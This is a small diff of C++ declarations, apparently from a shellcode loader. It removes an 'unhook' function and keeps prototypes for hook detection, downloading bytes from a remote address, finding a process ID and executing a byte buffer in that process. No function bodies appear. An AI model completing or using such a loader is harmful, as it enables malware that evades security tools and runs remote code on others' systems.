@@ -4,7 +4,6 @@
 
 // Functions definitions
 BOOL isItHooked(LPVOID addr);
-void unhook();
 std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);
 DWORD GetPID();
 void execution(std::vector<BYTE> sh, DWORD exPID);
